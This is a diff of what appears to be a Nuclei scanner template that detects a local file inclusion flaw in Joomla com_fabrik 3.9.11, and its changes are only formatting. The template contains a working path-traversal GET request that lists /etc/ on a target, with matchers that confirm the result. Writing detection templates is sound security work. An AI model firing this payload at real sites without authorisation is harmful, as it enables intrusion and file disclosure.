@@ -1,5 +1,4 @@
 id: joomla-com-fabrik-lfi
-
 info:
   name: Joomla! com_fabrik 3.9.11 - Local File Inclusion
   author: dhiyaneshDk
@@ -13,13 +12,11 @@ info:
     cwe-id: CWE-22
   metadata:
     max-request: 1
-  tags: joomla,lfi,edb,vuln
-
+  tags: edb,joomla,lfi,vuln
 http:
   - method: GET
     path:
       - '{{BaseURL}}/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../etc/'
-
     matchers-condition: and
     matchers:
       - type: word
@@ -29,8 +26,7 @@ http:
           - '"value":"group"'
           - '"disable":false'
         condition: and
-
       - type: status
         status:
           - 200
-
+        # digest: 4b0a004830460221008e6ca463a90ec4ab45b056c6a0b7cfcfdf3412b22eac0b9395b8493b44c71cf5022100af03c40320954112df4c6f36c52aa65f9f05ca70a802d8d459f36bd42dbf333c:922c64590222798bb761d5b6d8e72950
